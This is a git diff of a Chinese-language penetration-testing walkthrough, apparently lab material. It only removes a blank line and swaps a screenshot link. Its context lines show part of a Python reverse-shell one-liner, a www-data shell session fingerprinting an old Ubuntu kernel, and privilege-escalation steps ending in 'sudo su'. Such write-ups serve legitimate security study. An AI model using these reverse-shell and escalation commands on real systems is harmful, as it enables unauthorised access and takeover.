@@ -98,7 +98,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 查看Linux发行版和内核
 
 ```
-
 www-data@ubuntu:/var/www/test$ uname -a
 uname -a
 Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
@@ -193,4 +192,4 @@ chmod 777 /tmp/update
 sudo su
 ```
 
-![image-20220531111644163](../../.gitbook/assets/image-20220531111644163.png)
+![image-20230208160448038](../../.gitbook/assets/image-20230208160448038.png)
